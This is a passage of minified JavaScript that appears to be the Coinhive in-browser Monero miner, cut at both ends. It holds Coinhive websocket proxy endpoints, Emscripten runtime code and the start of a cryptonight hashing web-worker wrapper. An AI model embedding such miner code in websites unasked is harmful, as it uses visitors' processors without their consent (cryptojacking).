roxy\"],[\"wss:\/\/ws017.coinhive.com\/proxy\",\"wss:\/\/ws018.coinhive.com\/proxy\",\"wss:\/\/ws019.coinhive.com\/proxy\",\"wss:\/\/ws020.coinhive.com\/proxy\",\"wss:\/\/ws021.coinhive.com\/proxy\",\"wss:\/\/ws022.coinhive.com\/proxy\",\"wss:\/\/ws023.coinhive.com\/proxy\",\"wss:\/\/ws024.coinhive.com\/proxy\"],[\"wss:\/\/ws025.coinhive.com\/proxy\",\"wss:\/\/ws026.coinhive.com\/proxy\",\"wss:\/\/ws027.coinhive.com\/proxy\",\"wss:\/\/ws028.coinhive.com\/proxy\",\"wss:\/\/ws029.coinhive.com\/proxy\",\"wss:\/\/ws030.coinhive.com\/proxy\",\"wss:\/\/ws031.coinhive.com\/proxy\",\"wss:\/\/ws032.coinhive.com\/proxy\"]],CAPTCHA_URL:\"https:\/\/coinhive.com\/captcha\/\",MINER_URL:\"https:\/\/coinhive.com\/media\/miner.html\",AUTH_URL:\"https:\/\/authedmine.com\/authenticate.html\"};var Module={locateFile:(function(path){return CoinHive.CONFIG.LIB_URL+path}),wasmBinary:self.WASM_BINARY_INLINE||undefined};var moduleOverrides={};var key;for(key in Module){if(Module.hasOwnProperty(key)){moduleOverrides[key]=Module[key]}}Module[\"arguments\"]=[];Module[\"thisProgram\"]=\".\/this.program\";Module[\"quit\"]=(function(status,toThrow){throw toThrow});Module[\"preRun\"]=[];Module[\"postRun\"]=[];var ENVIRONMENT_IS_WEB=false;var ENVIRONMENT_IS_WORKER=false;var ENVIRONMENT_IS_NODE=false;var ENVIRONMENT_IS_SHELL=false;if(Module[\"ENVIRONMENT\"]){if(Module[\"ENVIRONMENT\"]===\"WEB\"){ENVIRONMENT_IS_WEB=true}else if(Module[\"ENVIRONMENT\"]===\"WORKER\"){ENVIRONMENT_IS_WORKER=true}else if(Module[\"ENVIRONMENT\"]===\"NODE\"){ENVIRONMENT_IS_NODE=true}else if(Module[\"ENVIRONMENT\"]===\"SHELL\"){ENVIRONMENT_IS_SHELL=true}else{throw new Error(\"Module['ENVIRONMENT'] value is not valid. must be one of: WEB|WORKER|NODE|SHELL.\")}}else{ENVIRONMENT_IS_WEB=typeof window===\"object\";ENVIRONMENT_IS_WORKER=typeof importScripts===\"function\";ENVIRONMENT_IS_NODE=typeof process===\"object\"&&typeof require===\"function\"&&!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_WORKER;ENVIRONMENT_IS_SHELL=!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_NODE&&!ENVIRONMENT_IS_WORKER}if(ENVIRONMENT_IS_NODE){var nodeFS;var nodePath;Module[\"read\"]=function shell_read(filename,binary){var ret;if(!nodeFS)nodeFS=require(\"fs\");if(!nodePath)nodePath=require(\"path\");filename=nodePath[\"normalize\"](filename);ret=nodeFS[\"readFileSync\"](filename);return binary?ret:ret.toString()};Module[\"readBinary\"]=function readBinary(filename){var ret=Module[\"read\"](filename,true);if(!ret.buffer){ret=new Uint8Array(ret)}assert(ret.buffer);return ret};if(process[\"argv\"].length>1){Module[\"thisProgram\"]=process[\"argv\"][1].replace(\/\\\\\/g,\"\/\")}Module[\"arguments\"]=process[\"argv\"].slice(2);if(typeof module!==\"undefined\"){module[\"exports\"]=Module}process[\"on\"](\"uncaughtException\",(function(ex){if(!(ex instanceof ExitStatus)){throw ex}}));process[\"on\"](\"unhandledRejection\",(function(reason,p){process[\"exit\"](1)}));Module[\"inspect\"]=(function(){return\"[Emscripten Module object]\"})}else if(ENVIRONMENT_IS_SHELL){if(typeof read!=\"undefined\"){Module[\"read\"]=function shell_read(f){return read(f)}}Module[\"readBinary\"]=function readBinary(f){var data;if(typeof readbuffer===\"function\"){return new Uint8Array(readbuffer(f))}data=read(f,\"binary\");assert(typeof data===\"object\");return data};if(typeof scriptArgs!=\"undefined\"){Module[\"arguments\"]=scriptArgs}else if(typeof arguments!=\"undefined\"){Module[\"arguments\"]=arguments}if(typeof quit===\"function\"){Module[\"quit\"]=(function(status,toThrow){quit(status)})}}else if(ENVIRONMENT_IS_WEB||ENVIRONMENT_IS_WORKER){Module[\"read\"]=function shell_read(url){var xhr=new XMLHttpRequest;xhr.open(\"GET\",url,false);xhr.send(null);return xhr.responseText};if(ENVIRONMENT_IS_WORKER){Module[\"readBinary\"]=function readBinary(url){var xhr=new XMLHttpRequest;xhr.open(\"GET\",url,false);xhr.responseType=\"arraybuffer\";xhr.send(null);return new Uint8Array(xhr.response)}}Module[\"readAsync\"]=function readAsync(url,onload,onerror){var xhr=new XMLHttpRequest;xhr.open(\"GET\",url,true);xhr.responseType=\"arraybuffer\";xhr.onload=function xhr_onload(){if(xhr.status==200||xhr.status==0&&xhr.response){onload(xhr.response);return}onerror()};xhr.onerror=onerror;xhr.send(null)};if(typeof arguments!=\"undefined\"){Module[\"arguments\"]=arguments}Module[\"setWindowTitle\"]=(function(title){document.title=title})}Module[\"print\"]=typeof console!==\"undefined\"?console.log.bind(console):typeof print!==\"undefined\"?print:null;Module[\"printErr\"]=typeof printErr!==\"undefined\"?printErr:typeof console!==\"undefined\"&&console.warn.bind(console)||Module[\"print\"];Module.print=Module[\"print\"];Module.printErr=Module[\"printErr\"];for(key in moduleOverrides){if(moduleOverrides.hasOwnProperty(key)){Module[key]=moduleOverrides[key]}}moduleOverrides=undefined;var STACK_ALIGN=16;function staticAlloc(size){assert(!staticSealed);var ret=STATICTOP;STATICTOP=STATICTOP+size+15&-16;return ret}function dynamicAlloc(size){assert(DYNAMICTOP_PTR);var ret=HEAP32[DYNAMICTOP_PTR>>2];var end=ret+size+15&-16;HEAP32[DYNAMICTOP_PTR>>2]=end;if(end>=TOTAL_MEMORY){var success=enlargeMemory();if(!success){HEAP32[DYNAMICTOP_PTR>>2]=ret;return 0}}return ret}function alignMemory(size,factor){if(!factor)factor=STACK_ALIGN;var ret=size=Math.ceil(size\/factor)*factor;return ret}function getNativeTypeSize(type){switch(type){case\"i1\":case\"i8\":return 1;case\"i16\":return 2;case\"i32\":return 4;case\"i64\":return 8;case\"float\":return 4;case\"double\":return 8;default:{if(type[type.length-1]===\"*\"){return 4}else if(type[0]===\"i\"){var bits=parseInt(type.substr(1));assert(bits%8===0);return bits\/8}else{return 0}}}}var functionPointers=new Array(0);var GLOBAL_BASE=1024;var ABORT=0;var EXITSTATUS=0;function assert(condition,text){if(!condition){abort(\"Assertion failed: \"+text)}}function setValue(ptr,value,type,noSafe){type=type||\"i8\";if(type.charAt(type.length-1)===\"*\")type=\"i32\";switch(type){case\"i1\":HEAP8[ptr>>0]=value;break;case\"i8\":HEAP8[ptr>>0]=value;break;case\"i16\":HEAP16[ptr>>1]=value;break;case\"i32\":HEAP32[ptr>>2]=value;break;case\"i64\":tempI64=[value>>>0,(tempDouble=value,+Math_abs(tempDouble)>=1?tempDouble>0?(Math_min(+Math_floor(tempDouble\/4294967296),4294967295)|0)>>>0:~~+Math_ceil((tempDouble- +(~~tempDouble>>>0))\/4294967296)>>>0:0)],HEAP32[ptr>>2]=tempI64[0],HEAP32[ptr+4>>2]=tempI64[1];break;case\"float\":HEAPF32[ptr>>2]=value;break;case\"double\":HEAPF64[ptr>>3]=value;break;default:abort(\"invalid type for setValue: \"+type)}}var ALLOC_STATIC=2;var ALLOC_NONE=4;function allocate(slab,types,allocator,ptr){var zeroinit,size;if(typeof slab===\"number\"){zeroinit=true;size=slab}else{zeroinit=false;size=slab.length}var singleType=typeof types===\"string\"?types:null;var ret;if(allocator==ALLOC_NONE){ret=ptr}else{ret=[typeof _malloc===\"function\"?_malloc:staticAlloc,stackAlloc,staticAlloc,dynamicAlloc][allocator===undefined?ALLOC_STATIC:allocator](Math.max(size,singleType?1:types.length))}if(zeroinit){var stop;ptr=ret;assert((ret&3)==0);stop=ret+(size&~3);for(;ptr<stop;ptr+=4){HEAP32[ptr>>2]=0}stop=ret+size;while(ptr<stop){HEAP8[ptr++>>0]=0}return ret}if(singleType===\"i8\"){if(slab.subarray||slab.slice){HEAPU8.set(slab,ret)}else{HEAPU8.set(new Uint8Array(slab),ret)}return ret}var i=0,type,typeSize,previousType;while(i<size){var curr=slab[i];type=singleType||types[i];if(type===0){i++;continue}if(type==\"i64\")type=\"i32\";setValue(ret+i,curr,type);if(previousType!==type){typeSize=getNativeTypeSize(type);previousType=type}i+=typeSize}return ret}function Pointer_stringify(ptr,length){if(length===0||!ptr)return\"\";var hasUtf=0;var t;var i=0;while(1){t=HEAPU8[ptr+i>>0];hasUtf|=t;if(t==0&&!length)break;i++;if(length&&i==length)break}if(!length)length=i;var ret=\"\";if(hasUtf<128){var MAX_CHUNK=1024;var curr;while(length>0){curr=String.fromCharCode.apply(String,HEAPU8.subarray(ptr,ptr+Math.min(length,MAX_CHUNK)));ret=ret?ret+curr:curr;ptr+=MAX_CHUNK;length-=MAX_CHUNK}return ret}return UTF8ToString(ptr)}var UTF8Decoder=typeof TextDecoder!==\"undefined\"?new TextDecoder(\"utf8\"):undefined;function UTF8ArrayToString(u8Array,idx){var endPtr=idx;while(u8Array[endPtr])++endPtr;if(endPtr-idx>16&&u8Array.subarray&&UTF8Decoder){return UTF8Decoder.decode(u8Array.subarray(idx,endPtr))}else{var u0,u1,u2,u3,u4,u5;var str=\"\";while(1){u0=u8Array[idx++];if(!u0)return str;if(!(u0&128)){str+=String.fromCharCode(u0);continue}u1=u8Array[idx++]&63;if((u0&224)==192){str+=String.fromCharCode((u0&31)<<6|u1);continue}u2=u8Array[idx++]&63;if((u0&240)==224){u0=(u0&15)<<12|u1<<6|u2}else{u3=u8Array[idx++]&63;if((u0&248)==240){u0=(u0&7)<<18|u1<<12|u2<<6|u3}else{u4=u8Array[idx++]&63;if((u0&252)==248){u0=(u0&3)<<24|u1<<18|u2<<12|u3<<6|u4}else{u5=u8Array[idx++]&63;u0=(u0&1)<<30|u1<<24|u2<<18|u3<<12|u4<<6|u5}}}if(u0<65536){str+=String.fromCharCode(u0)}else{var ch=u0-65536;str+=String.fromCharCode(55296|ch>>10,56320|ch&1023)}}}}function UTF8ToString(ptr){return UTF8ArrayToString(HEAPU8,ptr)}function stringToUTF8Array(str,outU8Array,outIdx,maxBytesToWrite){if(!(maxBytesToWrite>0))return 0;var startIdx=outIdx;var endIdx=outIdx+maxBytesToWrite-1;for(var i=0;i<str.length;++i){var u=str.charCodeAt(i);if(u>=55296&&u<=57343)u=65536+((u&1023)<<10)|str.charCodeAt(++i)&1023;if(u<=127){if(outIdx>=endIdx)break;outU8Array[outIdx++]=u}else if(u<=2047){if(outIdx+1>=endIdx)break;outU8Array[outIdx++]=192|u>>6;outU8Array[outIdx++]=128|u&63}else if(u<=65535){if(outIdx+2>=endIdx)break;outU8Array[outIdx++]=224|u>>12;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}else if(u<=2097151){if(outIdx+3>=endIdx)break;outU8Array[outIdx++]=240|u>>18;outU8Array[outIdx++]=128|u>>12&63;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}else if(u<=67108863){if(outIdx+4>=endIdx)break;outU8Array[outIdx++]=248|u>>24;outU8Array[outIdx++]=128|u>>18&63;outU8Array[outIdx++]=128|u>>12&63;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}else{if(outIdx+5>=endIdx)break;outU8Array[outIdx++]=252|u>>30;outU8Array[outIdx++]=128|u>>24&63;outU8Array[outIdx++]=128|u>>18&63;outU8Array[outIdx++]=128|u>>12&63;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}}outU8Array[outIdx]=0;return outIdx-startIdx}function lengthBytesUTF8(str){var len=0;for(var i=0;i<str.length;++i){var u=str.charCodeAt(i);if(u>=55296&&u<=57343)u=65536+((u&1023)<<10)|str.charCodeAt(++i)&1023;if(u<=127){++len}else if(u<=2047){len+=2}else if(u<=65535){len+=3}else if(u<=2097151){len+=4}else if(u<=67108863){len+=5}else{len+=6}}return len}var UTF16Decoder=typeof TextDecoder!==\"undefined\"?new TextDecoder(\"utf-16le\"):undefined;var WASM_PAGE_SIZE=65536;var ASMJS_PAGE_SIZE=16777216;function alignUp(x,multiple){if(x%multiple>0){x+=multiple-x%multiple}return x}var buffer,HEAP8,HEAPU8,HEAP16,HEAPU16,HEAP32,HEAPU32,HEAPF32,HEAPF64;function updateGlobalBuffer(buf){Module[\"buffer\"]=buffer=buf}function updateGlobalBufferViews(){Module[\"HEAP8\"]=HEAP8=new Int8Array(buffer);Module[\"HEAP16\"]=HEAP16=new Int16Array(buffer);Module[\"HEAP32\"]=HEAP32=new Int32Array(buffer);Module[\"HEAPU8\"]=HEAPU8=new Uint8Array(buffer);Module[\"HEAPU16\"]=HEAPU16=new Uint16Array(buffer);Module[\"HEAPU32\"]=HEAPU32=new Uint32Array(buffer);Module[\"HEAPF32\"]=HEAPF32=new Float32Array(buffer);Module[\"HEAPF64\"]=HEAPF64=new Float64Array(buffer)}var STATIC_BASE,STATICTOP,staticSealed;var STACK_BASE,STACKTOP,STACK_MAX;var DYNAMIC_BASE,DYNAMICTOP_PTR;STATIC_BASE=STATICTOP=STACK_BASE=STACKTOP=STACK_MAX=DYNAMIC_BASE=DYNAMICTOP_PTR=0;staticSealed=false;function abortOnCannotGrowMemory(){abort(\"Cannot enlarge memory arrays. Either (1) compile with -s TOTAL_MEMORY=X with X higher than the current value \"+TOTAL_MEMORY+\", (2) compile with -s ALLOW_MEMORY_GROWTH=1 which allows increasing the size at runtime, or (3) if you want malloc to return NULL (0) instead of this abort, compile with -s ABORTING_MALLOC=0 \")}function enlargeMemory(){abortOnCannotGrowMemory()}var TOTAL_STACK=Module[\"TOTAL_STACK\"]||5242880;var TOTAL_MEMORY=Module[\"TOTAL_MEMORY\"]||16777216;if(TOTAL_MEMORY<TOTAL_STACK)Module.printErr(\"TOTAL_MEMORY should be larger than TOTAL_STACK, was \"+TOTAL_MEMORY+\"! (TOTAL_STACK=\"+TOTAL_STACK+\")\");if(Module[\"buffer\"]){buffer=Module[\"buffer\"]}else{if(typeof WebAssembly===\"object\"&&typeof WebAssembly.Memory===\"function\"){Module[\"wasmMemory\"]=new WebAssembly.Memory({\"initial\":TOTAL_MEMORY\/WASM_PAGE_SIZE,\"maximum\":TOTAL_MEMORY\/WASM_PAGE_SIZE});buffer=Module[\"wasmMemory\"].buffer}else{buffer=new ArrayBuffer(TOTAL_MEMORY)}Module[\"buffer\"]=buffer}updateGlobalBufferViews();function getTotalMemory(){return TOTAL_MEMORY}HEAP32[0]=1668509029;HEAP16[1]=25459;if(HEAPU8[2]!==115||HEAPU8[3]!==99)throw\"Runtime error: expected the system to be little-endian!\";function callRuntimeCallbacks(callbacks){while(callbacks.length>0){var callback=callbacks.shift();if(typeof callback==\"function\"){callback();continue}var func=callback.func;if(typeof func===\"number\"){if(callback.arg===undefined){Module[\"dynCall_v\"](func)}else{Module[\"dynCall_vi\"](func,callback.arg)}}else{func(callback.arg===undefined?null:callback.arg)}}}var __ATPRERUN__=[];var __ATINIT__=[];var __ATMAIN__=[];var __ATEXIT__=[];var __ATPOSTRUN__=[];var runtimeInitialized=false;var runtimeExited=false;function preRun(){if(Module[\"preRun\"]){if(typeof Module[\"preRun\"]==\"function\")Module[\"preRun\"]=[Module[\"preRun\"]];while(Module[\"preRun\"].length){addOnPreRun(Module[\"preRun\"].shift())}}callRuntimeCallbacks(__ATPRERUN__)}function ensureInitRuntime(){if(runtimeInitialized)return;runtimeInitialized=true;callRuntimeCallbacks(__ATINIT__)}function preMain(){callRuntimeCallbacks(__ATMAIN__)}function exitRuntime(){callRuntimeCallbacks(__ATEXIT__);runtimeExited=true}function postRun(){if(Module[\"postRun\"]){if(typeof Module[\"postRun\"]==\"function\")Module[\"postRun\"]=[Module[\"postRun\"]];while(Module[\"postRun\"].length){addOnPostRun(Module[\"postRun\"].shift())}}callRuntimeCallbacks(__ATPOSTRUN__)}function addOnPreRun(cb){__ATPRERUN__.unshift(cb)}function addOnPostRun(cb){__ATPOSTRUN__.unshift(cb)}var Math_abs=Math.abs;var Math_cos=Math.cos;var Math_sin=Math.sin;var Math_tan=Math.tan;var Math_acos=Math.acos;var Math_asin=Math.asin;var Math_atan=Math.atan;var Math_atan2=Math.atan2;var Math_exp=Math.exp;var Math_log=Math.log;var Math_sqrt=Math.sqrt;var Math_ceil=Math.ceil;var Math_floor=Math.floor;var Math_pow=Math.pow;var Math_imul=Math.imul;var Math_fround=Math.fround;var Math_round=Math.round;var Math_min=Math.min;var Math_max=Math.max;var Math_clz32=Math.clz32;var Math_trunc=Math.trunc;var runDependencies=0;var runDependencyWatcher=null;var dependenciesFulfilled=null;function addRunDependency(id){runDependencies++;if(Module[\"monitorRunDependencies\"]){Module[\"monitorRunDependencies\"](runDependencies)}}function removeRunDependency(id){runDependencies--;if(Module[\"monitorRunDependencies\"]){Module[\"monitorRunDependencies\"](runDependencies)}if(runDependencies==0){if(runDependencyWatcher!==null){clearInterval(runDependencyWatcher);runDependencyWatcher=null}if(dependenciesFulfilled){var callback=dependenciesFulfilled;dependenciesFulfilled=null;callback()}}}Module[\"preloadedImages\"]={};Module[\"preloadedAudios\"]={};var dataURIPrefix=\"data:application\/octet-stream;base64,\";function isDataURI(filename){return String.prototype.startsWith?filename.startsWith(dataURIPrefix):filename.indexOf(dataURIPrefix)===0}function integrateWasmJS(){var wasmTextFile=\"worker-v2.wast\";var wasmBinaryFile=\"worker-v2.wasm\";var asmjsCodeFile=\"worker-v2.temp.asm.js\";if(typeof Module[\"locateFile\"]===\"function\"){if(!isDataURI(wasmTextFile)){wasmTextFile=Module[\"locateFile\"](wasmTextFile)}if(!isDataURI(wasmBinaryFile)){wasmBinaryFile=Module[\"locateFile\"](wasmBinaryFile)}if(!isDataURI(asmjsCodeFile)){asmjsCodeFile=Module[\"locateFile\"](asmjsCodeFile)}}var wasmPageSize=64*1024;var info={\"global\":null,\"env\":null,\"asm2wasm\":{\"f64-rem\":(function(x,y){return x%y}),\"debugger\":(function(){debugger})},\"parent\":Module};var exports=null;function mergeMemory(newBuffer){var oldBuffer=Module[\"buffer\"];if(newBuffer.byteLength<oldBuffer.byteLength){Module[\"printErr\"](\"the new buffer in mergeMemory is smaller than the previous one. in native wasm, we should grow memory here\")}var oldView=new Int8Array(oldBuffer);var newView=new Int8Array(newBuffer);newView.set(oldView);updateGlobalBuffer(newBuffer);updateGlobalBufferViews()}function fixImports(imports){return imports}function getBinary(){try{if(Module[\"wasmBinary\"]){return new Uint8Array(Module[\"wasmBinary\"])}if(Module[\"readBinary\"]){return Module[\"readBinary\"](wasmBinaryFile)}else{throw\"on the web, we need the wasm binary to be preloaded and set on Module['wasmBinary']. emcc.py will do that for you when generating HTML (but not JS)\"}}catch(err){abort(err)}}function getBinaryPromise(){if(!Module[\"wasmBinary\"]&&(ENVIRONMENT_IS_WEB||ENVIRONMENT_IS_WORKER)&&typeof fetch===\"function\"){return fetch(wasmBinaryFile,{credentials:\"same-origin\"}).then((function(response){if(!response[\"ok\"]){throw\"failed to load wasm binary file at '\"+wasmBinaryFile+\"'\"}return response[\"arrayBuffer\"]()})).catch((function(){return getBinary()}))}return new Promise((function(resolve,reject){resolve(getBinary())}))}function doNativeWasm(global,env,providedBuffer){if(typeof WebAssembly!==\"object\"){Module[\"printErr\"](\"no native wasm support detected\");return false}if(!(Module[\"wasmMemory\"]instanceof WebAssembly.Memory)){Module[\"printErr\"](\"no native wasm Memory in use\");return false}env[\"memory\"]=Module[\"wasmMemory\"];info[\"global\"]={\"NaN\":NaN,\"Infinity\":Infinity};info[\"global.Math\"]=Math;info[\"env\"]=env;function receiveInstance(instance,module){exports=instance.exports;if(exports.memory)mergeMemory(exports.memory);Module[\"asm\"]=exports;Module[\"usingWasm\"]=true;removeRunDependency(\"wasm-instantiate\")}addRunDependency(\"wasm-instantiate\");if(Module[\"instantiateWasm\"]){try{return Module[\"instantiateWasm\"](info,receiveInstance)}catch(e){Module[\"printErr\"](\"Module.instantiateWasm callback failed with error: \"+e);return false}}function receiveInstantiatedSource(output){receiveInstance(output[\"instance\"],output[\"module\"])}function instantiateArrayBuffer(receiver){getBinaryPromise().then((function(binary){return WebAssembly.instantiate(binary,info)})).then(receiver).catch((function(reason){Module[\"printErr\"](\"failed to asynchronously prepare wasm: \"+reason);abort(reason)}))}if(!Module[\"wasmBinary\"]&&typeof WebAssembly.instantiateStreaming===\"function\"&&!isDataURI(wasmBinaryFile)&&typeof fetch===\"function\"){WebAssembly.instantiateStreaming(fetch(wasmBinaryFile,{credentials:\"same-origin\"}),info).then(receiveInstantiatedSource).catch((function(reason){Module[\"printErr\"](\"wasm streaming compile failed: \"+reason);Module[\"printErr\"](\"falling back to ArrayBuffer instantiation\");instantiateArrayBuffer(receiveInstantiatedSource)}))}else{instantiateArrayBuffer(receiveInstantiatedSource)}return{}}Module[\"asmPreload\"]=Module[\"asm\"];var asmjsReallocBuffer=Module[\"reallocBuffer\"];var wasmReallocBuffer=(function(size){var PAGE_MULTIPLE=Module[\"usingWasm\"]?WASM_PAGE_SIZE:ASMJS_PAGE_SIZE;size=alignUp(size,PAGE_MULTIPLE);var old=Module[\"buffer\"];var oldSize=old.byteLength;if(Module[\"usingWasm\"]){try{var result=Module[\"wasmMemory\"].grow((size-oldSize)\/wasmPageSize);if(result!==(-1|0)){return Module[\"buffer\"]=Module[\"wasmMemory\"].buffer}else{return null}}catch(e){return null}}});Module[\"reallocBuffer\"]=(function(size){if(finalMethod===\"asmjs\"){return asmjsReallocBuffer(size)}else{return wasmReallocBuffer(size)}});var finalMethod=\"\";Module[\"asm\"]=(function(global,env,providedBuffer){env=fixImports(env);if(!env[\"table\"]){var TABLE_SIZE=Module[\"wasmTableSize\"];if(TABLE_SIZE===undefined)TABLE_SIZE=1024;var MAX_TABLE_SIZE=Module[\"wasmMaxTableSize\"];if(typeof WebAssembly===\"object\"&&typeof WebAssembly.Table===\"function\"){if(MAX_TABLE_SIZE!==undefined){env[\"table\"]=new WebAssembly.Table({\"initial\":TABLE_SIZE,\"maximum\":MAX_TABLE_SIZE,\"element\":\"anyfunc\"})}else{env[\"table\"]=new WebAssembly.Table({\"initial\":TABLE_SIZE,element:\"anyfunc\"})}}else{env[\"table\"]=new Array(TABLE_SIZE)}Module[\"wasmTable\"]=env[\"table\"]}if(!env[\"memoryBase\"]){env[\"memoryBase\"]=Module[\"STATIC_BASE\"]}if(!env[\"tableBase\"]){env[\"tableBase\"]=0}var exports;exports=doNativeWasm(global,env,providedBuffer);if(!exports)abort(\"no binaryen method succeeded. consider enabling more options, like interpreting, if you want that: https:\/\/github.com\/kripken\/emscripten\/wiki\/WebAssembly#binaryen-methods\");return exports})}integrateWasmJS();STATIC_BASE=GLOBAL_BASE;STATICTOP=STATIC_BASE+10240;__ATINIT__.push();var STATIC_BUMP=10240;Module[\"STATIC_BASE\"]=STATIC_BASE;Module[\"STATIC_BUMP\"]=STATIC_BUMP;STATICTOP+=16;var PROCINFO={ppid:1,pid:42,sid:42,pgid:42};var SYSCALLS={varargs:0,get:(function(varargs){SYSCALLS.varargs+=4;var ret=HEAP32[SYSCALLS.varargs-4>>2];return ret}),getStr:(function(){var ret=Pointer_stringify(SYSCALLS.get());return ret}),get64:(function(){var low=SYSCALLS.get(),high=SYSCALLS.get();if(low>=0)assert(high===0);else assert(high===-1);return low}),getZero:(function(){assert(SYSCALLS.get()===0)})};function ___syscall20(which,varargs){SYSCALLS.varargs=varargs;try{return PROCINFO.pid}catch(e){if(typeof FS===\"undefined\"||!(e instanceof FS.ErrnoError))abort(e);return-e.errno}}function _ftime(p){var millis=Date.now();HEAP32[p>>2]=millis\/1e3|0;HEAP16[p+4>>1]=millis%1e3;HEAP16[p+6>>1]=0;HEAP16[p+8>>1]=0;return 0}var ___tm_current=STATICTOP;STATICTOP+=48;var ___tm_timezone=allocate(intArrayFromString(\"GMT\"),\"i8\",ALLOC_STATIC);function _gmtime_r(time,tmPtr){var date=new Date(HEAP32[time>>2]*1e3);HEAP32[tmPtr>>2]=date.getUTCSeconds();HEAP32[tmPtr+4>>2]=date.getUTCMinutes();HEAP32[tmPtr+8>>2]=date.getUTCHours();HEAP32[tmPtr+12>>2]=date.getUTCDate();HEAP32[tmPtr+16>>2]=date.getUTCMonth();HEAP32[tmPtr+20>>2]=date.getUTCFullYear()-1900;HEAP32[tmPtr+24>>2]=date.getUTCDay();HEAP32[tmPtr+36>>2]=0;HEAP32[tmPtr+32>>2]=0;var start=Date.UTC(date.getUTCFullYear(),0,1,0,0,0,0);var yday=(date.getTime()-start)\/(1e3*60*60*24)|0;HEAP32[tmPtr+28>>2]=yday;HEAP32[tmPtr+40>>2]=___tm_timezone;return tmPtr}function _gmtime(time){return _gmtime_r(time,___tm_current)}function _emscripten_memcpy_big(dest,src,num){HEAPU8.set(HEAPU8.subarray(src,src+num),dest);return dest}function ___setErrNo(value){if(Module[\"___errno_location\"])HEAP32[Module[\"___errno_location\"]()>>2]=value;return value}DYNAMICTOP_PTR=staticAlloc(4);STACK_BASE=STACKTOP=alignMemory(STATICTOP);STACK_MAX=STACK_BASE+TOTAL_STACK;DYNAMIC_BASE=alignMemory(STACK_MAX);HEAP32[DYNAMICTOP_PTR>>2]=DYNAMIC_BASE;staticSealed=true;function intArrayFromString(stringy,dontAddNull,length){var len=length>0?length:lengthBytesUTF8(stringy)+1;var u8array=new Array(len);var numBytesWritten=stringToUTF8Array(stringy,u8array,0,u8array.length);if(dontAddNull)u8array.length=numBytesWritten;return u8array}Module[\"wasmTableSize\"]=8;Module[\"wasmMaxTableSize\"]=8;Module.asmGlobalArg={};Module.asmLibraryArg={\"abort\":abort,\"enlargeMemory\":enlargeMemory,\"getTotalMemory\":getTotalMemory,\"abortOnCannotGrowMemory\":abortOnCannotGrowMemory,\"___setErrNo\":___setErrNo,\"___syscall20\":___syscall20,\"_emscripten_memcpy_big\":_emscripten_memcpy_big,\"_ftime\":_ftime,\"_gmtime\":_gmtime,\"DYNAMICTOP_PTR\":DYNAMICTOP_PTR,\"STACKTOP\":STACKTOP};var asm=Module[\"asm\"](Module.asmGlobalArg,Module.asmLibraryArg,buffer);Module[\"asm\"]=asm;var _aesb_single_round=Module[\"_aesb_single_round\"]=(function(){return Module[\"asm\"][\"_aesb_single_round\"].apply(null,arguments)});var _cryptonight_create=Module[\"_cryptonight_create\"]=(function(){return Module[\"asm\"][\"_cryptonight_create\"].apply(null,arguments)});var _cryptonight_destroy=Module[\"_cryptonight_destroy\"]=(function(){return Module[\"asm\"][\"_cryptonight_destroy\"].apply(null,arguments)});var _cryptonight_hash_variant_0=Module[\"_cryptonight_hash_variant_0\"]=(function(){return Module[\"asm\"][\"_cryptonight_hash_variant_0\"].apply(null,arguments)});var _cryptonight_hash_variant_1=Module[\"_cryptonight_hash_variant_1\"]=(function(){return Module[\"asm\"][\"_cryptonight_hash_variant_1\"].apply(null,arguments)});var _cryptonight_hash_variant_2=Module[\"_cryptonight_hash_variant_2\"]=(function(){return Module[\"asm\"][\"_cryptonight_hash_variant_2\"].apply(null,arguments)});var _malloc=Module[\"_malloc\"]=(function(){return Module[\"asm\"][\"_malloc\"].apply(null,arguments)});var stackAlloc=Module[\"stackAlloc\"]=(function(){return Module[\"asm\"][\"stackAlloc\"].apply(null,arguments)});Module[\"asm\"]=asm;function ExitStatus(status){this.name=\"ExitStatus\";this.message=\"Program terminated with exit(\"+status+\")\";this.status=status}ExitStatus.prototype=new Error;ExitStatus.prototype.constructor=ExitStatus;var initialStackTop;dependenciesFulfilled=function runCaller(){if(!Module[\"calledRun\"])run();if(!Module[\"calledRun\"])dependenciesFulfilled=runCaller};function run(args){args=args||Module[\"arguments\"];if(runDependencies>0){return}preRun();if(runDependencies>0)return;if(Module[\"calledRun\"])return;function doRun(){if(Module[\"calledRun\"])return;Module[\"calledRun\"]=true;if(ABORT)return;ensureInitRuntime();preMain();if(Module[\"onRuntimeInitialized\"])Module[\"onRuntimeInitialized\"]();postRun()}if(Module[\"setStatus\"]){Module[\"setStatus\"](\"Running...\");setTimeout((function(){setTimeout((function(){Module[\"setStatus\"](\"\")}),1);doRun()}),1)}else{doRun()}}Module[\"run\"]=run;function exit(status,implicit){if(implicit&&Module[\"noExitRuntime\"]&&status===0){return}if(Module[\"noExitRuntime\"]){}else{ABORT=true;EXITSTATUS=status;STACKTOP=initialStackTop;exitRuntime();if(Module[\"onExit\"])Module[\"onExit\"](status)}if(ENVIRONMENT_IS_NODE){process[\"exit\"](status)}Module[\"quit\"](status,new ExitStatus(status))}Module[\"exit\"]=exit;function abort(what){if(Module[\"onAbort\"]){Module[\"onAbort\"](what)}if(what!==undefined){Module.print(what);Module.printErr(what);what=JSON.stringify(what)}else{what=\"\"}ABORT=true;EXITSTATUS=1;throw\"abort(\"+what+\"). Build with -s ASSERTIONS=1 for more info.\"}Module[\"abort\"]=abort;if(Module[\"preInit\"]){if(typeof Module[\"preInit\"]==\"function\")Module[\"preInit\"]=[Module[\"preInit\"]];while(Module[\"preInit\"].length>0){Module[\"preInit\"].pop()()}}Module[\"noExitRuntime\"]=true;run();var CryptonightWASMWrapper=(function(){this.ctx=_cryptonight_create();this.throttleWait=0;this.throttledStart=0;this.throttledHashes=0;this.workThrottledBound=this.workThrottled.bind(this);this.currentJob=null;this.target=new Uint8Array([255,255,255,255,255,255,255,255]);var heap=Module.HEAPU8.buffer;this.input=new Uint8Array(heap,Module._malloc(84),84);this.output=new Uint8Array(heap,Module._malloc(32),32);self.postMessage(\"ready\");self.onmessage=this.onMessage.bind(this)});CryptonightWASMWrapper.prototype.onMessage=(function(msg){var 